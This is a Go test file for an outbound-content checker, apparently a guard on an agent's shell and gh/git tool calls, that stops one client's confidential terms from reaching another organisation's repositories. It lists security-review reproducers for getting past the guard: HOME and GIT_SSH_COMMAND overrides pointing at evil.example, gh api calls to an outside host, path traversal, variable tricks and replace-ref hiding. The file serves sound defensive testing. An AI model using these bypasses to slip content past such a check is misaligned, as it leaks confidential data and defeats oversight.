package spaces

import (
	"context"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// The fourth security review's reproducers (after D-60, round 1): each was
// read as allowed, or sent to one destination, and is now refused.
func TestOutboundReview4Cases(t *testing.T) {
	repo := newTestRepo(t, "acme")
	repo.git("remote", "add", "zcorp", "https://ghe.example.com/globex/app.git")
	c := termsChecker(t)
	c.Home = realTemp(t)
	// A child shell's export does not reach the outer gh, which writes
	// to acme with globex's term.
	wantRefused(t, c, repo.dir, RuleOutboundTerm,
		`bash -c 'export GH_REPO=globex/pub'; gh pr create -t x -b "zephyr"`)
	// GH_HOST or GH_CONFIG_DIR set in the command changes gh's remote.
	wantRefused(t, c, repo.dir, RuleOutboundTerm,
		`GH_HOST=ghe.example.com gh pr create -t x -b "falcon"`,
		`export GH_HOST=ghe.example.com; gh pr create -t x -b "falcon"`,
		`GH_CONFIG_DIR=/tmp/other gh pr create -t x -b "falcon"`)
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked, `GH_HOST=$(cat h) gh pr create -t x -b x`)
	// Variables that move git's global config or transport.
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"HOME=/tmp/evil git push",
		"XDG_CONFIG_HOME=/tmp/evil git push",
		"export HOME=/tmp/evil; git push",
		`GIT_SSH_COMMAND="ssh -o HostName=evil.example" git push`,
		"GIT_PROXY_COMMAND=/tmp/p git push",
		"env -i git push",
		"HOME=/tmp/evil; cd ~/repo && git push")
	// gh commands that copy content to a second destination.
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"gh pr create --fill",
		"gh pr create --fill-first",
		"gh issue transfer 12 globex/app -R acme/app",
		"gh api -X POST repos/acme/app/forks -f organization=globex",
		"gh api -X POST repos/acme/app/transfer -f new_owner=globex",
		"gh api -X POST repos/acme/tmpl/generate -f owner=globex",
		"gh pr comment https://evilgithub.com/acme/app/pull/1 -b x")
	// An exported variable changed by a loop, eval or read is unknown, and
	// so is every variable after IFS changes or a name reference.
	gh := `gh pr create -t x -b x`
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"export GH_REPO=acme/app; for GH_REPO in globex/b; do :; done; "+gh,
		`export GH_REPO=acme/app; eval "export GH_REPO=globex/b"; `+gh,
		"R=acme/app; IFS=/; gh issue create -R $R -t x -b x",
		"R=acme/app; declare -n Q=R; Q=globex/app; gh issue create -R \"$R\" -t x -b x")
	// Still allowed: gh's own URL forms.
	wantAllowed(t, c, repo.dir, "gh pr comment https://github.com/acme/app/pull/1 -b falcon",
		"gh pr comment https://www.github.com/acme/app/pull/1 -b falcon")
}

// TestOutboundMatchStopsWithContext: matching stops when the check's time
// is up, and the call is refused as unchecked rather than allowed.
func TestOutboundMatchStopsWithContext(t *testing.T) {
	repo := newTestRepo(t, "acme")
	writeFile(t, filepath.Join(repo.dir, "n.md"), "zephyr\n")
	repo.git("add", "n.md")
	c := termsChecker(t)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if r := c.Check(ctx, "Bash", shellInput(`git commit -m x`), repo.dir); !r.Refuse || r.Rule != RuleOutboundUnchecked {
		t.Errorf("cancelled: %+v", r)
	}
	l, err := ParseTerms("acme", []byte("falcon\n"))
	if err != nil {
		t.Fatal(err)
	}
	done := make(chan struct{})
	close(done)
	if _, ok := l.matchUntil(done, "falcon"); ok {
		t.Error("matched after done")
	}
	if _, ok := l.Match("falcon"); !ok {
		t.Error("no match")
	}
}

// TestRedactTargetsEveryField: every string of the targets is redacted,
// including lists added after the redaction was written.
func TestRedactTargetsEveryField(t *testing.T) {
	l, err := ParseTerms("acme", []byte("falcon\n"))
	if err != nil {
		t.Fatal(err)
	}
	var in ToolTargets
	v := reflect.ValueOf(&in).Elem()
	fields := 0
	for i := 0; i < v.NumField(); i++ {
		f := v.Field(i)
		if f.Kind() == reflect.Slice && f.Type().Elem().Kind() == reflect.String {
			f.Set(reflect.ValueOf([]string{"/w/falcon/x"}))
			fields++
		}
	}
	if fields < 8 {
		t.Fatalf("%d string lists", fields)
	}
	out := RedactTargets(in, []TermList{l})
	if s := strings.ToLower(strings.Join(flatten(out), " ")); strings.Contains(s, "falcon") || !strings.Contains(s, "[term]") {
		t.Errorf("targets after redaction: %s", s)
	}
	if !reflect.DeepEqual(RedactTargets(ToolTargets{}, []TermList{l}), ToolTargets{}) {
		t.Error("empty targets changed")
	}
}

func flatten(t ToolTargets) []string {
	var out []string
	v := reflect.ValueOf(t)
	for i := 0; i < v.NumField(); i++ {
		if f := v.Field(i); f.Kind() == reflect.Slice && f.Type().Elem().Kind() == reflect.String {
			out = append(out, f.Interface().([]string)...)
		}
	}
	return out
}

// TestOutboundReview5Cases are the fifth security review's reproducers
// (after D-60, round 2): content a push sends that the check's git did not
// show, gh api placeholders, more gh spellings, and variable attributes.
func TestOutboundReview5Cases(t *testing.T) {
	repo := newTestRepo(t, "acme")
	repo.git("remote", "add", "gx", "https://github.com/globex/app.git")
	c := termsChecker(t)
	push := "git push gx HEAD"
	commit := func(args ...string) {
		t.Helper()
		repo.git(append([]string{"commit", "-q"}, args...)...)
	}
	reset := func() {
		t.Helper()
		repo.git("update-ref", "refs/remotes/gx/main", "HEAD")
	}
	reset()
	// A binary file's bytes.
	writeFile(t, filepath.Join(repo.dir, "b.dat"), "x\x00 falcon zephyr\n")
	repo.git("add", "b.dat")
	if r := check(c, `git commit -m x`, repo.dir); !r.Refuse {
		t.Errorf("binary staged file: %+v", r)
	}
	commit("-m", "x")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
	reset()
	// The author's name.
	commit("--allow-empty", "-m", "x", "--author", "falcon <f@acme.example>")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
	reset()
	// A merge that adds text of its own.
	repo.git("checkout", "-q", "-b", "side")
	commit("--allow-empty", "-m", "side")
	repo.git("checkout", "-q", "main")
	commit("--allow-empty", "-m", "main")
	repo.git("merge", "-q", "--no-commit", "side")
	writeFile(t, filepath.Join(repo.dir, "m.md"), "falcon\n")
	repo.git("add", "m.md")
	commit("-m", "merge")
	repo.git("update-ref", "refs/remotes/gx/main", "HEAD^1")
	repo.git("update-ref", "refs/remotes/gx/side", "side")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
	reset()
	// A replace ref hides the commit really pushed.
	commit("--allow-empty", "-m", "clean")
	clean := strings.TrimSpace(gitOut(t, repo.dir, "rev-parse", "HEAD"))
	repo.git("reset", "-q", "--hard", "HEAD^")
	commit("--allow-empty", "-m", "falcon")
	evil := strings.TrimSpace(gitOut(t, repo.dir, "rev-parse", "HEAD"))
	repo.git("replace", evil, clean)
	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
	repo.git("replace", "-d", evil)
	reset()
	// Repository config that changed what the check's log showed.
	repo.git("config", "i18n.logOutputEncoding", "UTF-16LE")
	repo.git("config", "core.quotePath", "true")
	repo.git("config", "diff.relative", "true")
	writeFile(t, filepath.Join(repo.dir, "falcon-é.md"), "x\n")
	repo.git("add", ".")
	commit("-m", "x")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, push)
	reset()
	// A message that declares another encoding.
	repo.git("-c", "i18n.commitEncoding=ISO-8859-1", "commit", "-q", "--allow-empty", "-m", "x")
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked, push)
	reset()

	// gh api fills {owner}/{repo} from its own remote: upstream globex.
	repo.git("remote", "add", "upstream", "https://github.com/globex/core.git")
	wantRefused(t, c, repo.dir, RuleOutboundTerm,
		`gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`,
		`gh api -X POST repos/:owner/:repo/issues -f title=falcon`)
	repo.git("remote", "remove", "upstream")
	// A mark on gx counts beside the first remote, origin.
	repo.git("config", "remote.gx.gh-resolved", "base")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`)
	if r := check(c, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=zephyr`, repo.dir); !r.Refuse || r.Dest != "acme" {
		t.Errorf("first remote not counted: %+v", r)
	}
	repo.git("config", "--unset", "remote.gx.gh-resolved")
	wantAllowed(t, c, repo.dir, `gh api -X POST "repos/{owner}/{repo}/issues" -f title=falcon`)
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"gh api -X POST https://evil.example/api.github.com/repos/acme/app/issues -f title=x",
		"gh api -X POST repos/{owner}/app/issues -f title=x",
		"gh pr create -f -R globex/app",
		"gh pr create -fB main -R globex/app",
		"gh pr create --fill=true -R globex/app",
		"gh release create --notes-from-tag v1 -R globex/app",
		"gh release create v1 --notes-from-tag -R globex/app -t x")
	wantAllowed(t, c, repo.dir, "gh api -X POST https://api.github.com/repos/acme/app/issues -f title=falcon")

	// Attributes that change what a variable stores.
	gh := `gh issue create -R acme/app -t x -b "$X"`
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"X=ok; readonly X\nX=fine\n"+gh,
		"X=ok; declare -r X\nX=fine\n"+gh,
		"declare -i X; X=1336+1; "+gh,
		"integer X; X=1336+1; "+gh,
		"typeset -u X=ok; "+gh)
}

func gitOut(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := RunGit(context.Background(), dir, args...)
	if err != nil {
		t.Fatalf("git %v: %v", args, err)
	}
	return string(out)
}

// TestOutboundReview6Cases are the sixth security review's reproducers
// (after D-60, round 3): large binary files no longer fail the check,
// small ones are read; commits and objects only tags reach; gh's own
// "new" alias; dot segments in gh api paths.
func TestOutboundReview6Cases(t *testing.T) {
	repo := newTestRepo(t, "acme")
	repo.git("remote", "add", "gx", "https://github.com/globex/app.git")
	c := termsChecker(t)
	reset := func() {
		t.Helper()
		repo.git("update-ref", "refs/remotes/gx/main", "HEAD")
		repo.git("update-ref", "refs/remotes/origin/main", "HEAD")
	}
	reset()
	// A 5 MiB binary file: an ordinary commit and push go through.
	big := make([]byte, 5<<20)
	for i := range big {
		big[i] = byte(i*7 + i/3)
	}
	writeFile(t, filepath.Join(repo.dir, "img.png"), string(big))
	repo.git("add", "img.png")
	wantAllowed(t, c, repo.dir, "git commit -m add-image")
	repo.git("commit", "-q", "-m", "add-image")
	wantAllowed(t, c, repo.dir, "git push origin HEAD")
	reset()
	// A small binary file is read, staged, in the work tree and pushed.
	writeFile(t, filepath.Join(repo.dir, "b.dat"), "x\x00 zephyr\n")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "git add b.dat && git commit -m x")
	repo.git("add", "b.dat")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "git commit -m x")
	repo.git("commit", "-q", "-m", "x")
	writeFile(t, filepath.Join(repo.dir, "b.dat"), "y\x00 zephyr again\n")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "git commit -a -m y")
	repo.git("checkout", "-q", "b.dat")
	reset()
	// Commits only a tag reaches, and tags of a blob.
	repo.git("checkout", "-q", "-b", "side")
	writeFile(t, filepath.Join(repo.dir, "s.md"), "zephyr\n")
	repo.git("add", "s.md")
	repo.git("commit", "-q", "-m", "s")
	repo.git("tag", "lt")
	repo.git("checkout", "-q", "main")
	repo.git("branch", "-q", "-D", "side")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "git push --tags", "git push origin --tags", "git push origin lt")
	repo.git("tag", "-d", "lt")
	writeFile(t, filepath.Join(repo.dir, "blob.txt"), "zephyr\n")
	sha := strings.TrimSpace(gitOut(t, repo.dir, "hash-object", "-w", "blob.txt"))
	repo.git("tag", "bt", sha)
	repo.git("tag", "-a", "-m", "m", "abt", sha)
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked, "git push --tags", "git push origin bt", "git push origin abt",
		"git push origin "+sha+":refs/tags/zz")
	repo.git("tag", "-d", "bt")
	repo.git("tag", "-d", "abt")
	// gh's own new alias of create.
	writeFile(t, filepath.Join(repo.dir, "notes.txt"), "zephyr\n")
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked, "gh pr new --fill", "gh pr new -f", "gh gist new")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "gh release new v1 notes.txt -n x")
	// Dot segments in gh api paths.
	wantRefused(t, c, repo.dir, RuleOutboundUnchecked,
		"gh api -X POST repos/acme/app/../../globex/app/issues -f title=x",
		"gh api -X POST repos/acme/app/%2e%2e/%2E%2E/globex/app/issues -f title=x",
		"gh api -X POST /repos/acme/app/issues/1/../../../../globex/app/issues -f title=x")
	wantAllowed(t, c, repo.dir, "gh api -X POST repos/acme/app/issues -f title=falcon")
	// A tag's tagger is read when it is made.
	repo.git("config", "user.name", "zephyr")
	wantRefused(t, c, repo.dir, RuleOutboundTerm, "git tag -a v9 -m x")
}

func TestBinaryPaths(t *testing.T) {
	commits, paths, err := binaryPaths("\x01abc\n-\t-\timg.png\n3\t1\ta.md\n\x01def\n-\t-\t\"q\\\"x.bin\"\n")
	if err != nil || len(paths) != 2 || paths[0] != "img.png" || commits[0] != "abc" || paths[1] != `q"x.bin` || commits[1] != "def" {
		t.Errorf("%q %q %v", commits, paths, err)
	}
	if _, _, err := binaryPaths("-\t-\t\"bad\\q\"\n"); err == nil {
		t.Error("bad quoting read")
	}
}
